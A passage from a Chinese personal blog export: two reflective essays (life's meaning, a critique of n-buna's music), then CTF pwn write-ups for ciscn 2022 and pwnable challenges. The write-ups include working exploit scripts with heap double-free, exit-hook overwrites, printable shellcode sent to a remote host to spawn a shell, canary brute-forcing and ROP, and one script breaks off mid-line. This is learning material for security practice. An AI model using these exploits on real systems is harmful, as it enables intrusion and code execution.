我又想起很早之前看过的一个动画电影，叫做心灵奇旅，虽然我当时完全是因为里面的jazz元素才会对这个电影产生兴趣的，但是看完以后，不得不说其中有一些观点与思考至今影响着我。毕竟是动画片，所以导演将他的想法不加掩盖地展示出来——人生的意义，在于活着的每一点细节。仅仅是听着脚下踩过的枯叶发出的嘎吱声——我便感觉我是实实在在活着的。 ​ 再往前推，还是一部动画电影，应当是大名鼎鼎了，叫做寻梦环游记，给出的答案也很清晰——事业并不是构成人生幸福的全部，家人与自我的陪伴同等重要。 ​ 这些作品给出的答案都是相似的，人不应该被现实束缚，不应该被自身束缚，按照自己的想法，过好每一天，实际就是幸福所在。因为人终有一死，无论生前功名如何，死后只是一剖黄土，风一吹，就被永远遗忘了。那么与其累死累活拼搏一辈子，不如快乐地过每一天，至少人生没有白费。 ​ 这是他们的观点，不是我的观点。诸如此类的想法只会在当我心情极度低落的时候才会被拿来利用，试图让我自己开心一些。而仅仅抱持着这一种态度过活的人，我个人认为是极度自私的。 ​ 现实永远是充满了无穷多变量的，遵循理想条件活着的人，要么物质条件极为富余，要么一无所有。形而上学的概念通常在理想条件下被研究，回归了现实，这就是狗屁不通的胡言乱语，任何有关于社会学，心理学研究实验的结果，都需要绝对精准地控制变量。任何放在现实条件下讨论人性的议题，都需要对细节进行绝对的把控。 ​ 失之毫厘，差之千里，用在心理学实验上毫不为过。然而就是在这样的事实下，文艺作品大张旗鼓，用极为高贵的人格水准要求我们断舍离，要求我们回归自我，要求我们不要忘记年少轻狂，我不否认这其中的道理，这就像高中班主任苦口婆心希望学生们用心学习一样，学不学是他们自己的事情。 ​ 或许可能会认为我写这些是在批评什么东西，但实则不然，从始至终我都只是在批评自己。其实无非是一个“想做”和“应该做”的事情选择的问题，但是矛盾在于这两者并不是完全对立的，并且想做的事情某一天也会变得不想做，应该做的事情也有毫无意义的可能，人生的意义便在此体现。并且，无论是有意义或者无意义，随着人生命的终结，任何意义都化为了无意义。 ​ 今天写下这些不明所以的东西，起初是因为一个人在协会，感到了孤独。现在已经好很多了，并且也有猫来陪我。很久没有感到孤独了，所以也不常写这种，今天当破一次例了，如果不小心被人看到这篇语无伦次没有重点的杂记，请不要嘲笑我。 ​","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"vivi","slug":"vivi","permalink":"https://fuurinko.github.io/tags/vivi/"}]},{"title":"深夜锐评拿不拿","slug":"vivi_深夜锐评拿不拿","date":"2022-06-20T16:31:06.109Z","updated":"2022-10-24T12:34:56.058Z","comments":true,"path":"2022/06/21/vivi_深夜锐评拿不拿/","link":"","permalink":"https://fuurinko.github.io/2022/06/21/vivi_%E6%B7%B1%E5%A4%9C%E9%94%90%E8%AF%84%E6%8B%BF%E4%B8%8D%E6%8B%BF/","excerpt":"","text":"​ 0​ 期末周，绩点比国赛重要，所以摆烂没有刷题。今天yrsk放了三首月光再演的曲子，拿厨都哭了，于是自然地多听了一些yrsk，并且看到了豆瓣上对于盗作的评论，有点不开心，故记录一下。 1​ 目前关于拿曲，尤其是yrsk时期的曲子，最大的批评是“同质化严重”，并且我个人也认为拿不拿所追求的“创作出不迎合大众的曲子”与他本身写出来的东西是相矛盾的。曾经我自己给自己台阶下，认为yrsk的“不迎合大众”主要体现在歌词上，然而今天看了b站上群友对于盗作的分析，我感觉拿不拿确实还是想要强调音乐性上的独特与自我追寻，从这点上来看与歌词关系并不大，那么矛盾又回来了。 ​ 如果迎合大众指的是流行乐，或者广义上符合大众审美，旋律编曲令人舒适的音乐。抛开配器以及人声，只谈旋律以及编排，打个比方，经典华语乐坛，抖音神曲，流行纯音乐或是洗脑电音都属于这一范畴。那么什么音乐是不符合大众审美的呢？简单举几个例子，几乎所有重型音乐、大部分爵士，布鲁斯、实验音乐、大部分广义古典乐，以及民族或者世界音乐。我不听硬摇，但是我感觉至少在亚洲文化里硬摇并不是主流音乐。话说我从来不严格划分流行和摇滚以及朋克的界限，对我的耳朵来说这几种风格都差不多，所以不区分也没有任何问题，我粗暴地直接将我听的所有旋律相对比较悦耳的摇滚或者朋克划到流行中，举几个例子，真夜中，拿，绝体绝命以后的radwimps。 ​ 回到拿曲，拿不管是哪个时期，写出来的曲子对我来说都是如假包换的流行乐，可能卖春稍微雷鬼一点，但是旋律还是很拿，我感觉拿有一点被自己的风格限制住了，虽然能够看出拿一直在努力突破编曲风格的界限，从普通的拿味jpop到现代布鲁斯以及雷鬼，爵士都有尝试过，但是我个人感觉这其中变化的都是编曲风格而不是旋律风格，虽然严格来讲旋律并不很受风格影响。 ​ 并且，很严重的一点是，虽然拿非常努力地尝试不同的风格，作出他喜欢的曲子，但是他还是被限制住了。如果你学过但凡一点点乐理，你会发现一个456的和弦进行能够串起拿曲大部分所有的段落，不同的曲子只是单个和弦的种类改变了一些，比如三和弦改成大九，就成了思想犯的前奏，听起来非常日系且由于键盘音色显得耳目一新，但是走向还是456。如果你再了解一点点吉他，你会发现拿真的很喜欢用五声音阶乱飞，大部分拿式jrock的solo都是由大调五声，布鲁斯五声的上下行爬来爬去而成，但凡多听一些，就会使人厌倦。 ​ 以上说的这些，由于拿已经274天没有出过新曲了，就拿最近的三首歌以及创作这张专作为比较，可以看出拿对于编曲上的大多数问题已经有了自己的改进思路，比方说春泥棒，嘘月以及老人与海，月吠，编曲的留白相对增加，没有以前那么满，有的却也因此变得耐听了一些。拿更加注重与对于简单编曲的音响效果的控制以及细节的雕刻，但是简单不意味着单一，同一个riff整首歌重复也太划水了（点名月吠）。 ​ 上一首真正从人声旋律上戳中我的拿曲还是盗作副歌以及雨晴。不过戳中我不代表好，戳不中也不代表好。我个人真的非常旋律至上，一首歌的好听与否百分之八十看旋律，当然如果音色太拉让我感到明显的不适我也会跳过，从这点来讲我的审美并没有很偏离大众，换句话说，我不太喜欢纯炫技的作品。并且我也不能一耳朵直接听出调式以及和弦进行，只是完全凭感觉去评价一首歌。 ​ 而我感觉一首歌旋律的好听与耐听之间的平衡，就在与恰到好处的音响效果与留白。比如我博客歌单中很多歌都是我这几个月特别特别喜欢而百听不厌的歌曲，比如说李晓川老师的伊韦尔东、同样也是为伊韦尔东演奏小提琴的彭飞老师的第三个月（这个一度把我听哭了）、上原广美的haze和brand new day、西小协第一乐章、德彪西的月光，以及大海第一乐章。这些歌对我来说留白就是没有人声的干扰导致的纯净性，以及恰到好处的无调性营造，避免了大量旋律造成审美疲劳。比如在爵士乐里，就是严格编排与自由即兴的穿插交错，或是离调或不协和音程的音符跳动。而流行乐里，tk的copy light，haze和withe out直接提名我的年度流行歌top3了，具体原因大概就是戳中我的旋律一瞬即逝，但是我就是想为这么一秒钟听完一首歌。这也解释了为什么听多了重型通常会审美疲劳，当同样的刺激多次重复，兴奋感就不那么强烈了，久而久之甚至会厌倦。但是如果兴奋感是来自音响效果，那么这样的刺激通常很难钝化。 ​ 虽然拿在编曲上有所改变，但是人声旋律依然在原地踏步。这也是我无法评价的，不过就算拿写得歌再不好听，他所创造出来的故事，音乐pv或是歌词氛围，依然能够打动我，谁叫我是傻卵拿厨。从我第一次听拿不拿到现在，已经五年了，这五年我的音乐审美发生了巨大的变化，从一个只听朋克和jpop的术曲小鬼变成口味多元偏爱器乐曲的老大妈了，以前听到一首评论999一下的歌就觉得自己标新立异与众不同了，现在喜欢的歌里超过999的不超过十分之一也无动于衷。但是就算是这样，我最喜欢的音乐还是yrsk。也许我之前专注于音乐性，旋律性的观点过于片面，艺术本身就应该有着宽广的包容性，而音乐更加不能局限于音乐本身，任何从音乐衍生出来的东西，当它们融合在一起，展现同一个故事，同一种主题，这种感觉难道不是非常棒的吗？ ​ 本来还想讲一下suis与拿曲表现力的关系，但是有点晚了，就这样吧。 ​ ​ ​ ​","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"幻想曲","slug":"幻想曲","permalink":"https://fuurinko.github.io/tags/%E5%B9%BB%E6%83%B3%E6%9B%B2/"}]},{"title":"newest_note","slug":"ciscn_2022_newest_note","date":"2022-06-11T04:51:16.916Z","updated":"2022-06-12T07:44:59.230Z","comments":true,"path":"2022/06/11/ciscn_2022_newest_note/","link":"","permalink":"https://fuurinko.github.io/2022/06/11/ciscn_2022_newest_note/","excerpt":"","text":"给分享会准备的一个简单的复现。 太长不看 逆向确定漏洞点-uaf以及越界读写 glibc2.32指针异或绕过 glibc2.34取消malloc free hook后的利用方式 check ​ 依旧是保护全开。这里比较不好的地方就是libc的版本比较高。2.34有一个众所周知的更新就是去掉了malloc_hook以及free_hook。所以劫持程序流的方式也不再是从前的无脑打hook了。像湖湘杯的house of emma是利用fsop，有的题也可以找到exit hook来打。 逆向​ 这个题的程序逻辑还是很清晰。大致讲一下就是 ​ ​ 开始可以先申请一个几乎无大小限制的堆，然后初始化为0。这里事实上是存在漏洞的，但是放在后面讲。 ​ 然后进入菜单，整体只有三个功能，增删查，经典没有改。每个功能看一下。 add​ 这里需要我们自己指定的是idx而不是size，而idx最大不能超过我们开头输的那个idx，同时也不能小于0，这里规避了负数下标的情况，但依然可能存在越界读取。具体原因稍后分析。 ​ 具体看一下这里的申请流程。首先在ptr+8*idx上申请一个0x30大小的堆空间，相当于在ptr+8*idx这个地址保存了这个0x30 chunk的指针。接着idx2自减，这里暂时不清楚idx2是多少。这个地方的逻辑详细解释就是idx是八字节，8*8就是64字节，也就是一个0x40的空间。通过ptr+8 * idx的方式来索引申请chunk的地址。 ​ 然后输入chunk的内容。也比较清楚。随便动调一下确认一下结构。 12add(0,b&#x27;a&#x27;*40)add(1,b&#x27;b&#x27;*40) ​ 看起来非常的正常。继续下一个功能。 show​ ​ 这里的逻辑与add大同小异，不详细解释了，有一个需要注意的点就是可以看到打印只有一个idx合法性的检查，所以这里只要idx在范围内，无论指向的东西是不是真实的chunk内容都可以打印出来，这也就是这个题很关键的一个漏洞，越界读。（每年国赛都来） free​ 这个代码稍微长一点点。首先还是一个idx合法性检查，然后free 指向chunk内容的指针，不过说实话第一次看没看懂这个if是干啥的。限制free次数？那那个提取低字有何意义？先不管这个。 ​ 不过很显然这里有uaf。 利用​ 总结一下逆向过程中发现的漏洞点以及疑点。 ​ 首先就是free的uaf，简单直白，这个点的利用涉及到后面的任意地址写。 ​ 其次是idx的大小可以自由规定，相当于一个越界读写。比如我们在设置idx值的时候设置为一个特别大的数，比如说0x20000000，那么这个size肯定已经需要mmap来申请libc上的地址了，所以这时候ptr实际是一个libc的偏移基准值，我们就可以通过show出构造好的idx来leak libc。此外也正是因为这里idx_max特别大，所以三个功能中对于idx的合法性检测基本都可以无视。 ​ 所以这里第一步就是leak libc。 leak libc​ 为了确定思路的合理性，先测试一下。 确实能够打印出东西，那么这里我们需要了leak libc。所以需要选择一个位于libc，但内容也为libc地址的地址，种类我们选择main_arena。 ​ 关于main_arena的偏移如何找，可以直接将libc用ida打开，找到malloc_trim函数，然后 ​ （偷图） ` ​ 这里的偏移是0x218C60。 ​ 但是加上偏移以后实际地址对应的值是0，但是下面一片地址倒是有值，干脆就用他们来计算了。 123456789101112off1 = 0x7ffff7fa9ce0-0x7ffff7b8d000off2 = 0x7ffff7fa9ce0-0x7ffff7d91000p.recvuntil(&quot;A small notebook keeps everything&quot;)p.recvuntil(&quot;How many pages your notebook will be? :&quot;)p.sendline(str(0x20040000))show(off1/8)p.recvuntil(&quot;Content: &quot;)libcbase = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) - off2 + 0x10 system = libcbase + libc.sym[&#x27;system&#x27;]log.info(hex(libcbase)) ​ 确实有用。 ​ 那么接下来就是指针的利用了 double free构造任意地址写​ （ps：由于没有找到靠谱的libc所以现在正在编译，编译未完成前就嗯看了） ​ 首先因为uaf，所以我们能够方便地打印出free chunk的fd和bk，这里就能先leak 一个heap base。接着我们想要实现的是一个任意地址写，这里其实和glibc版本没有太大的关系，因为堆块读写的条件其实已经很好了，uaf的品相也非常之上佳，并且由于size都是限定为0x30，所以也不用考虑乱七八糟的size问题，所以这里往简单的方向想，一个思路是tcache dup，另一个是fastbin dup。 ​ 需要明确的是这个题并没有edit，所以不管是fastbin还是tcache bin都需要利用排堆构造double free来实现修改fd，但是如果是tcache dup的话，double free首先还需要改key，这就与我们的初衷相矛盾了，所以这里优先考虑fastbin 的思路，其实也就是一个2.29下的fastbin double。 ​ 既然是fastbin double free，我们肯定先要拿到fastbin，所以需要先把tcache填一填。然后将第七第八个chunk放入fastbin，double free一下构成循环链表，再将tcache拿出来，然后申请刚刚double free的fastbin，进行任意地址写，思路非常简单清晰。 ​ 这里唯一需要考虑的就是任意地址写的目标地址，如果是其他版本直接无脑打malloc hook或者free hook就好了，但是这里没有。 ​ fsop的话太过于小题大做了（我暂时也不是很会house of emma那个），可以考虑直接打exit hook。 ​ 这里由于实在太板子了，我就直接copy exp了。 12345678910111213141516171819202122for i in range(9): add(i,b&#x27;a&#x27;*8)for i in range(0,6): free(i)# fill tcacheshow(0)#tcahce 1p.recvuntil(&quot;Content: &quot;)heapbase = u64(p.recv(5).ljust(8,b&#x27;\\x00&#x27;)) heapbase=heapbase&lt;&lt;12log.info(hex(heapbase))free(7)#fastbin -&gt;7free(8)#-&gt;8-&gt;7free(7)##-&gt;7-&gt;8-&gt;7,double freefor i in range(7): add(i,b&#x27;a&#x27;*8)#tcacheadd(7,p64(exit))add(7,p64(0))add(7,p64(0))add(7,p64(onegadget)*2) exit_hook劫持​ exit hook的劫持之前倒是没有接触很多，毕竟有malloc 谁打这个。 ​ 在这里算是一个新知识了。这个东西并不像是malloc hook或者free hook那样可以直接简单地通过libc base加一个简单的偏移找到。由于调用它的层级比较多，所以需要一层一层地寻找。 ​ libc还在编译，没有符号的话不太好找，先看原理。 ​ 由于在libc2.31后这个东西发生了较大改变，所以分类讨论。 2.31前可以直接套公式，exit hook是 12libc-2.23 : 0×5f0040+3848 libc-2.27 : 0×61b060 + 3840 2.31后 libc2.31 9.2下偏移为0x1ED608 libc2.31 9.7只能利用fsop。 而这里其实与2，31后9.2的情况类似，对应libc段是可写的。 其他情况的原理就不分析了，这里主要看一下当前libc的exit hook 。 其实也是通过__run_exit_handlers调用__libc_atexit中的函数，而__libc_atexit是libc中的一个段，所以可以找到对应的偏移。 这里我寻找的方式是ida,偏移为0x21A6C8。具体方式是通过搜索定位到fpclose-&gt;fpclose(0)，找到后者对应的偏移。 注意到这里偏移为0x21A6C8，但是实际exp编写的时候是0x21A6C0。有一个八字节的偏差。这里其实就是一个16字节对齐的问题，如果是c8就会报错，所以改成c0，这里随便怎么改其实只要对齐然后不要差得超过0x30就行。比如c8 -0x10 ，然后多来几个个onegadget效果也是一样的。 这里具体的原理就不介绍了，感兴趣可以去搜一下。 指针异或最后这里还要注意一个点。就是glibc2.32的指针异或。 ​ glibc2.32引入的新的防御机制-safe-linking(异或加密),其核心思想是:将指针的地址右移12位再和指针本身异或,该操作是在chunk被放入tcache bin和从tcache bin中取出时进行。 也就是 12#define PROTECT_PTR(pos, ptr) \\ ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr))) 所以当我们构造fd的时候，要考虑到后面程序会对这个指针进行一个相当于解密的工作，所以我们填进去的fd内容也需要是被加密的，即fd的地址右移再异或fd本身，这里fd的地址再右移可以直接用堆基址来处理，然后异或system地址就好了。 1target = ((heapbase)&gt;&gt;12)^(libcbase+off3) 参考http://1.117.139.210/2021/05/20/PWN学习—exit-hook-偷家/ https://bbs.pediy.com/thread-273101.htm https://blog.csdn.net/qq_40712959/article/details/115696356","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"ciscn","slug":"ciscn","permalink":"https://fuurinko.github.io/tags/ciscn/"}]},{"title":"login_normal","slug":"ciscn_2022_login","date":"2022-05-30T05:14:03.237Z","updated":"2022-06-12T03:07:02.013Z","comments":true,"path":"2022/05/30/ciscn_2022_login/","link":"","permalink":"https://fuurinko.github.io/2022/05/30/ciscn_2022_login/","excerpt":"","text":"好久没有写博客了，水一个，后面两天在写完信号与系统大作业以后预计复现一下另外两道题。这题还是蛮简单的也就是两个点，第一操作符逻辑能不能逆出来，第二能不能第一时间反应这个是可见字符shellcode。调试主要都在逆向阶段了，利用真的没有任何难度。主要可能是别的队pwn手还是少了，不然这个题可能解会超过web。 checksec libc2.33 逆向首先我们在s处可以输入一个比较大的字符串。 参考2021 ciscn game，先逆出程序指令为opt:1\\nmsg:ro0t\\r\\n格式,在下面三个功能中可以发现，mmap申请了一片4096size的可执行空间，并将s的内容拷贝进去，而需要申请首先需要切换至root。 并且在最后一句直接执行了s，这里基本可以确定是一个写shellcode的思路了。shellcode的地址储存在rdx寄存器上。 这里对我们输入的msg字符串进行了过滤，也就是shellcode必须为可见字符串。之前做过类似的题，可以直接使用工具生成。 这里使用https://github.com/veritas501/ae64的工具，首先使用pwntools模块生成64位shellcode，然后 1234567891011121314from pwn import *from ae64 import AE64context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;p = process(&#x27;./login&#x27;)obj = AE64()sc = obj.encode(asm(shellcraft.sh()),&#x27;rdx&#x27;)p.sendline(sc)p.interactive() ​ 即可生成shellcode。 最后的exp： 123456789101112from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;59.110.24.117&quot;,12587)payload1 = b&quot;opt:1\\nmsg:ro0t\\r\\n&quot;p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,payload1)shellcode = b&quot;RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZj3TYfi9520t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9200t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP&quot;payload2 = b&quot;opt:2\\nmsg:&quot; + shellcode + b&quot;\\r\\n&quot;print(disasm(shellcode))p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,payload2)p.interactive() ​","categories":[{"name":"STACK - Shellcode","slug":"STACK-Shellcode","permalink":"https://fuurinko.github.io/categories/STACK-Shellcode/"}],"tags":[{"name":"ciscn","slug":"ciscn","permalink":"https://fuurinko.github.io/tags/ciscn/"}]},{"title":"pwnable - secret garden(tbc)","slug":"week12_6_pwnable_secret_garden","date":"2022-05-21T07:22:51.685Z","updated":"2022-06-12T03:08:17.183Z","comments":true,"path":"2022/05/21/week12_6_pwnable_secret_garden/","link":"","permalink":"https://fuurinko.github.io/2022/05/21/week12_6_pwnable_secret_garden/","excerpt":"","text":"overview reverse​ 依旧是比较传统的菜单，这个应该不会还是栈题了吧。 add​ 相对比较清晰，malloc使用的是size[0]，这个值是可以自己控制的，但是也不排除有溢出的可能性。 ​ 后面则是将flower的ptr插入到head中。 show​ 没啥特别的，就是打印出来。 ​ free这里有可能有溢出，并且有uaf free2也是free，但是这里是free了head【0】 利用​ 2.23+uaf。感觉是比较明显的fastbin attack。 ​ leak的话应该也是用比较传统的unsorted bin leak的那一套，先创造一个unsorted bin，然后free leak。用一个师傅的话来说就是，无聊堆题。 ​ 最近确实不是非常想做题，，，做点pwncollege换一下心情吧。 ​","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"攻防世界 - house of grey","slug":"week12_5_pawnable_house_of-grey","date":"2022-05-20T07:11:28.316Z","updated":"2022-06-12T03:08:01.816Z","comments":true,"path":"2022/05/20/week12_5_pawnable_house_of-grey/","link":"","permalink":"https://fuurinko.github.io/2022/05/20/week12_5_pawnable_house_of-grey/","excerpt":"","text":"overview​ 最近事情比较多，一般来说五月底的事情都很多，这个学期尤为严重。自己做的话一天一题基本不可能了，这里就大致学习一下思路吧。 ​ 依旧是全绿。 ​ 并且似乎是没有libc的，这个应该是攻防世界上的题。还是18年国赛半决赛捏。 reverse​ 程序的大致逻辑其实比较简单。首先还是随机划分一个巨大的空间，然后clone一个进程 。进程中实现了一个类似see the file一样的文件的打开和读取功能，但是程序有沙箱保护。 ​ fn函数中 1buf[(read(0, buf, 0x28uLL) - 1)] = 0; ​ 可以溢出4个字节。 ​ ​ 我们看一下这四个字节溢出到哪里去了。 ​ buf和这个v8正好相邻，而v8是: ​ 所以只要我们覆盖v8的指针，这里就可以进行一个任意地址写。 ​ ps：我关闭了地址随机化。 ​ 然而由于开启了随机化，我们需要leak地址。 ​ 这里就是整个题目最核心的trick，由于我们可以任意读写文件，所以我们可以查看/proc/self/maps来获取进程的libc基地址以及其他地址 ​ ​ 这样就可以非常简单轻松地拿到libc了 ​ 于是我们希望将一个返回地址任意地址写为rop链，然而注意到fn函数退出并没有返回，而是直接exit（0）了。所以我们需要用别的函数返回地址覆盖。 ​ 比如说我们可以用read函数,那么要获得read的返回地址，我们只有stack的基地址，似乎不太够，因为stack是mmap出的一个巨大的空间，而每次读取内容只能读取0x100000大小的数据，全部读完需要100次，无论如何都没有办法一次性读出来，所以就只能分段找。我们可以在输入的时候加一个标志，然后利用循环找出我们的栈地址。 ​ ​ 找到read 的ret地址以后的操作就比较简单了，直接覆盖为rop链就好了。 ​ pps：这里用seccomp保护了，但是问题不大，常规orw就行。我个人感觉这题比较简单（当然是知道proc的情况下）写这么点主要是因为我现在心态有点浮躁，静不下心来，并且也不太愿意花时间再做栈题了。 ​","categories":[{"name":"STACK - ROP","slug":"STACK-ROP","permalink":"https://fuurinko.github.io/categories/STACK-ROP/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pawnable - babystack","slug":"week12_3.1_pawnable_babystack","date":"2022-05-18T03:49:48.180Z","updated":"2022-05-18T09:49:23.370Z","comments":true,"path":"2022/05/18/week12_3.1_pawnable_babystack/","link":"","permalink":"https://fuurinko.github.io/2022/05/18/week12_3.1_pawnable_babystack/","excerpt":"","text":"overview​ ​ 全绿的栈题。 reverse​ 有了上一次的经验就知道这个题的前面的随机数也是canary了。 ​ 所以在略过一些目前看似没有必要的代码之后，整个程序的逻辑大致如下“ ​ 输密码，密码是一个空字节。 ​ 然后每次可以copy 63 字节的东西,到64字节的char数组中。 1234printf(&quot;Copy :&quot;);sub_CA0(src, 63LL);strcpy(a1, src);return puts(&quot;It is magic copy !&quot;); ​ 栈的情况如下，比较清晰 0x00007fffffff0a33是一个指向0的指针。 ​ 让我比较疑惑的就是，理论上程序对输入做了限制，那么只有63个字节能被输入，但是这里可以输入将近80个字节，并且会自动跳过canary。 ​ 就像这样： ​ ​ 然后我发现一个比较恐怖的问题，这个题没有打印。栈题的no leak，且是full relro，意味着不能改got，也不能ret2dl。 ​ 突然想到，既然是copy，那么就可以控制输入用原来的buf上的地址覆盖。研究一下。 ​ 这里我们想要覆盖返回地址，也就是0x7fffffffe518，我们copy 的起始地址是0x7fffffffe4b0，中间有0x68个字节，src的起始buf是0x7fffffffe420，对应加上偏移的地址是0x7fffffffe488，值是0x0000555555400b70 ​ 这里又出现了问题。现在我们输入了63个a在src中，一切看起来都很正常。 ​ 但是当输入64个a。之前明明是src的地方又变成了奇怪的内容。我们重新来看一下这个输入的函数。当我们读入第63个字符时， 1result = a1[len - 1];#result = src[62] ​ 如果第62个字节不是空字节，那么函数设置的“将回车替换为空字节”的操作就不生效。也就是字符串是没有空字节截断的。 ​ 然而在strcpy中copy的实际上是带有空字节的字符串，所有空字节前所有的字符都会被copy。但是这并不能解释“只要我们多输入一个字符，src就会被清空” ​ 现在的状况就是，我们无法只是通过输入63个字节进入src控制copy更多的地址到返回地址上，因为src也存在很多截断的空字节。并且对应的地址似乎也不是合法的返回地址。 ​ 但是不意味着这个思路行不通，我们可以再研究一下。 ​ 手贱去看了wp，发现利用的过程比我想象得要复杂一些，而且果然有我没有看出的漏洞点。同样的，是我需要想到，但是最终没有想到的点，就是login函数和copy函数进入时栈帧指针并没有变化，而变量在栈上的位置也是相同的，于是就可以通过在login中输入，再在copy中完成溢出。然而这样就意味着我们不能再直接通过空字节绕过密码的验证了。 ​ 那么只能爆破出来了。这里的密码也就是程序生成的canary，所以不管怎么样都是需要爆破的。 ​ 其实暴力破解这个思路我目前来说都是很少使用的，我个人并不是很喜欢爆破，主要docker的性能确实比较差，但是人总归是要进步的。 ​ 大概讲下爆破的原理吧，其实很简单，就是利用login的strcmp ,每次输入一个字节+空字节，就相当于逐个字节比较。 ​ 借鉴一下别的师傅的脚本： 123456789101112131415161718def blast(len,s1 = b&#x27;&#x27;): while (1): for i in range(1,256): if i == 10: continue s2 = s1 + chr(i) login(b&#x27;a&#x27;*0x10 + b&#x27;1&#x27;+ b&#x27;a&#x27;*0x7 + s2 + b&#x27;\\x00&#x27;) if &quot;Success&quot; in p.recv(): s1 = s2 print(&quot;[+]found!&quot;) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(&quot;1&quot;) sleep(1) break if len(s2) == length: break return s1 这道题确实是有学到东西的，就是爆破。以后遇到类似strcmp的时候就可以尝试了。 ​ ​","categories":[{"name":"STACK","slug":"STACK","permalink":"https://fuurinko.github.io/categories/STACK/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pawnable - spirited_away","slug":"week12_2_pawnable_spirited_away","date":"2022-05-17T02:47:48.848Z","updated":"2022-05-18T03:48:35.854Z","comments":true,"path":"2022/05/17/week12_2_pawnable_spirited_away/","link":"","permalink":"https://fuurinko.github.io/2022/05/17/week12_2_pawnable_spirited_away/","excerpt":"","text":"overview​ 栈题。 reverse有一点诡异。 整体的逻辑非常清晰简单，但是有疑惑的地方。 12345if ( choice == &#x27;Y&#x27; || choice == &#x27;y&#x27; )&#123; free(name); // UAF?? goto LABEL_2;&#125; ​ 这里将name free，但是我在bin中并咩有找到。 利用​ reason处有一个leak。因为reason的地址本身就有内容，可以leak一个地址。或者说整个reason范围内的地址我们都可以任意leak。 ​ 虽然reason的输入会导致地址的低位被覆盖，但是从原本的地址可以看出这实际上是个libc，所以四舍五入我们leak 了libc，这里直接给出了__GI__IO_file_xsputn，但是我觉得应该不是io file的题。。。吧？ ​ 这里的heap感觉没有利用空间，free了name过后bin直接与top chunk合并了，就没有办法在bin中利用，这应该是纯粹防止我们太快乐栈溢出的。所以关注点还是应该放在栈上。 ​ 值得一提的是，重新输入数据会覆盖原有的，heap段也类似，只不过是free了原来的指针。，因此输入的栈地址并不会改变。 ​ 所以现在的困难在于如何溢出。 ​ 可以看到0xffffdde8之后就是返回地址，但是程序对于数据的输入有着严格的限制，我们正常情况下很难溢出。 ​ 但是栈上控制执行流，或者说构造栈溢出的办法本身就很少。age作为一个int测试过无法溢出。 ​ 不会真的是io file吧。虽然之前也做过类似的题，但是也太突然了。 ​ 。。 ​ ​ 没有思路，去看了wp，确实学到了新的利用思路。 ​ 这里之前被我自己迷惑了，没有认真看，以为这个数组就是个idx，但是实际上一个字符串数组，所以当sprintf时，如果cnt增长到三位数，这个字符串的最后一个字节就会向后覆盖，而后面正好就是nbyte，所以能将它覆盖为固定的0x6e，虽然不是特别大，但是足够溢出comment和name了。 ​ 接下来本该是非常自然的想法：由于nbytes。也就是之前的60字节呗覆盖为了0x6e字节，所以我们的name和comment都能够溢出。 ​ 查看一下这两个溢出能导致怎样的结果： ​ ​ 可以看到reason的输入是在0xffffdd98，而comment是0xffffdd40，name则是在heap段，所以我们并不能直接溢出comment或者name来覆盖retn。 ​ 现在我们只能溢出name和comment，这两个地址，name目前来说没有意义，而comment，注意到0xffffdd94实际上是name所在的heap的地址，所以我们是不是能溢出这个地址来修改name输入的地方呢？ ​ 计算一下偏移。溢出大概需要输入 84+ 4。 ​ 溢出heap指针为stack地址，也就是reason所在的地址，这样在reason伪造一个fake chunk，free name时就会将我们在reason伪造的chunk free，此后分配的name就是在栈上。由于name的输入字符可以构成溢出，因此可以控制程序执行流，从而getshell。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./spirited_away&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/32/lib/libc-2.23.so&quot;&#125;)#p = remote(&quot;chall.pwnable.tw&quot;,10302)libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)elf = ELF(&#x27;./spirited_away&#x27;)one_gadget = [0x3a819,0x5f065,0x5f066]def run(name,reason,comment): p.recvuntil(&quot;name: &quot;) p.send(name) p.recvuntil(&quot;age: &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;movie? &quot;) p.send(reason) p.recvuntil(&quot;comment: &quot;) p.send(comment)#overwirte nbytesfor i in range(100): run(b&#x27;a&#x27;,b&#x27;a&#x27;,b&#x27;b&#x27;) p.send(&quot;y&quot;)#leak libcrun(b&#x27;1&#x27;,b&#x27;\\x10&#x27;,b&#x27;2&#x27;*30) p.recvuntil(&quot;Reason:&quot;)xsputn = u32(p.recv()[1:5])libc_base = xsputn - libc.symbols[&quot;__GI__IO_file_xsputn&quot;]one_gadget = libc_base + one_gadget[0]system_addr = libc_base + libc.sym[&#x27;system&#x27;]bin_sh_addr = libc_base + 